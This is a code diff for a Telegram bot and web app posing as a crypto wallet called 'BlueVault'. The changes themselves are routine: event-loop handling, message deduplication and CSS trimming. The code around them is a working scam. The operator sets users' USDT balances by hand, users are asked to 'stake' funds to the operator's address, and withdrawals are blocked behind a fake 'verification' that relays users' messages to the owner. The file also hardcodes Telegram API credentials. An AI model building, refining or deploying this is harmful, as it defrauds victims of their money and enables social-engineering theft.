@@ -1,14 +1,10 @@
 import asyncio
 import logging
 import os
-import sys
-import nest_asyncio
 from threading import Thread
 from telethon import TelegramClient, events, Button
 from telethon.errors import SessionPasswordNeededError, FloodWaitError
 from flask import Flask, request, jsonify
-
-nest_asyncio.apply()
 
 API_ID = 8
 API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
@@ -18,10 +14,14 @@ CRYPTO_ADDRESS = '0xYourAddress'
 
 logging.basicConfig(level=logging.INFO)
 
-bot = TelegramClient('bot_session', API_ID, API_HASH)
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
+bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
 app = Flask(__name__)
 user_balances = {}
 verification_sessions = {}
+_handled = set()
 
 HTML_PAGE = '''
 <!DOCTYPE html>
@@ -36,17 +36,17 @@ HTML_PAGE = '''
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); padding: 16px; min-height: 100vh; }
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
-        .logo { font-size: 20px; font-weight: 700; color: var(--blue-light); letter-spacing: -0.5px; } .logo span { color: var(--blue); }
+        .logo { font-size: 20px; font-weight: 700; color: var(--blue-light); } .logo span { color: var(--blue); }
         .status { width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 6px var(--green); }
         .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 12px; }
         .balance-label { font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
         .balance-value { font-size: 42px; font-weight: 700; color: #fff; line-height: 1; }
         .balance-usd { font-size: 14px; color: var(--text-secondary); margin-top: 6px; }
         .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
-        .btn { background: var(--card); border: 1px solid var(--border); color: var(--blue-light); padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; text-align: center; }
-        .btn:active { background: var(--border); transform: scale(0.98); }
+        .btn { background: var(--card); border: 1px solid var(--border); color: var(--blue-light); padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; text-align: center; }
+        .btn:active { background: var(--border); }
         .notice { background: var(--card); border: 1px solid var(--blue); border-radius: 12px; padding: 16px; text-align: center; color: var(--blue-light); font-size: 14px; margin-top: 12px; }
-        .address-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 14px; font-size: 13px; word-break: break-all; color: var(--text-secondary); margin: 12px 0; font-family: 'SF Mono', 'Menlo', monospace; }
+        .address-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 14px; font-size: 13px; word-break: break-all; color: var(--text-secondary); margin: 12px 0; font-family: monospace; }
         .divider { height: 1px; background: var(--border); margin: 16px 0; }
         .hidden { display: none; }
     </style>
@@ -54,21 +54,30 @@ HTML_PAGE = '''
 <body>
     <div class="header"><div class="logo">Blue<span>Vault</span></div><div class="status" id="statusDot"></div></div>
     <div id="mainScreen"><div class="card"><div class="balance-label">Total Balance</div><div class="balance-value" id="balance">0.00</div><div class="balance-usd">USDT</div><div class="actions"><button class="btn" onclick="showStake()">↗ Stake</button><button class="btn" onclick="showWithdraw()">↓ Withdraw</button></div></div></div>
-    <div id="stakeScreen" class="hidden"><div class="card"><div class="balance-label">Stake USDT</div><p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Send USDT to the address below</p><div class="address-box" id="cryptoAddress"></div><button class="btn" onclick="copyAddress()" style="width:100%;background:var(--blue);border-color:var(--blue);color:#fff;">Copy Address</button><div class="divider"></div><button class="btn" onclick="goBack()" style="width:100%;">← Back</button></div></div>
+    <div id="stakeScreen" class="hidden"><div class="card"><div class="balance-label">Stake USDT</div><p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Send USDT to the address below</p><div class="address-box" id="cryptoAddress"></div><button class="btn" onclick="copyAddress()" style="width:100%;background:var(--blue);color:#fff;">Copy Address</button><div class="divider"></div><button class="btn" onclick="goBack()" style="width:100%;">← Back</button></div></div>
     <div id="withdrawScreen" class="hidden"><div class="card"><div class="balance-label">Withdraw</div><div class="notice">⚠ Complete verification using <b>/verify</b> in the bot</div><div class="divider"></div><button class="btn" onclick="goBack()" style="width:100%;">← Back</button></div></div>
     <script>
         const tg = window.Telegram.WebApp; tg.expand(); tg.ready();
         const userId = tg.initDataUnsafe?.user?.id || 0;
-        function updateBalance(){fetch('/get_balance?user_id='+userId).then(r=>r.json()).then(d=>{document.getElementById('balance').textContent=parseFloat(d.balance).toFixed(2)}).catch(()=>{document.getElementById('statusDot').style.background='var(--red)';document.getElementById('statusDot').style.boxShadow='0 0 6px var(--red)'})}
+        function updateBalance(){fetch('/get_balance?user_id='+userId).then(r=>r.json()).then(d=>{document.getElementById('balance').textContent=parseFloat(d.balance).toFixed(2)}).catch(()=>{document.getElementById('statusDot').style.background='var(--red)'})}
         function showStake(){document.getElementById('mainScreen').classList.add('hidden');document.getElementById('stakeScreen').classList.remove('hidden');document.getElementById('withdrawScreen').classList.add('hidden');fetch('/get_address').then(r=>r.json()).then(d=>{document.getElementById('cryptoAddress').textContent=d.address})}
         function showWithdraw(){document.getElementById('mainScreen').classList.add('hidden');document.getElementById('stakeScreen').classList.add('hidden');document.getElementById('withdrawScreen').classList.remove('hidden')}
         function goBack(){document.getElementById('mainScreen').classList.remove('hidden');document.getElementById('stakeScreen').classList.add('hidden');document.getElementById('withdrawScreen').classList.add('hidden')}
-        function copyAddress(){navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent).then(()=>{tg.showPopup({title:'Copied',message:'Address copied to clipboard'})})}
+        function copyAddress(){navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent).then(()=>{tg.showPopup({title:'Copied',message:'Address copied'})})}
         updateBalance();setInterval(updateBalance,15000);
     </script>
 </body>
 </html>
 '''
+
+def already_handled(event):
+    msg_id = event.id
+    if msg_id in _handled:
+        return True
+    _handled.add(msg_id)
+    if len(_handled) > 10000:
+        _handled.clear()
+    return False
 
 @app.route('/')
 def index():
@@ -85,12 +94,14 @@ def get_address():
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
+    if already_handled(event): return
     user_id = event.sender_id
     user_balances.setdefault(user_id, 0)
     await event.respond('🛡 BlueVault Wallet', buttons=[[Button.url('🚀 Open App', 'https://t.me/Buraldikbot/Hhvhjk')]])
 
 @bot.on(events.NewMessage(pattern='/setbalance'))
 async def set_balance(event):
+    if already_handled(event): return
     if event.sender_id != OWNER_ID: return
     try:
         _, target_id, amount = event.text.split()
@@ -102,10 +113,12 @@ async def set_balance(event):
 
 @bot.on(events.NewMessage(pattern='/myid'))
 async def myid(event):
+    if already_handled(event): return
     await event.respond(f'Your ID: {event.sender_id}')
 
 @bot.on(events.NewMessage(pattern='/msg'))
 async def msg(event):
+    if already_handled(event): return
     if event.sender_id != OWNER_ID: return
     try:
         parts = event.text.split(maxsplit=2)
@@ -117,17 +130,19 @@ async def msg(event):
 
 @bot.on(events.NewMessage(pattern='/verify'))
 async def verify(event):
-    user_id = event.sender_id
-    verification_sessions[user_id] = True
+    if already_handled(event): return
+    verification_sessions[event.sender_id] = True
     await event.respond('✅ Verification started. Send your messages below.')
-    await bot.send_message(OWNER_ID, f'#VERIFY User {user_id} started verification.')
+    await bot.send_message(OWNER_ID, f'#VERIFY User {event.sender_id} started verification.')
 
 @bot.on(events.NewMessage(func=lambda e: e.sender_id in verification_sessions and e.text and not e.text.startswith('/')))
 async def handle_verification(event):
+    if already_handled(event): return
     await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {event.text}')
 
 @bot.on(events.NewMessage(pattern='/reply'))
 async def reply(event):
+    if already_handled(event): return
     if event.sender_id != OWNER_ID: return
     try:
         parts = event.text.split(maxsplit=2)
@@ -139,6 +154,7 @@ async def reply(event):
 
 @bot.on(events.NewMessage(pattern='/endverify'))
 async def end_verify(event):
+    if already_handled(event): return
     if event.sender_id != OWNER_ID: return
     try:
         target_id = int(event.text.split()[1])
@@ -157,4 +173,4 @@ def run_flask():
 
 if __name__ == '__main__':
     Thread(target=run_flask, daemon=True).start()
-    asyncio.get_event_loop().run_until_complete(main())
+    loop.run_until_complete(main())
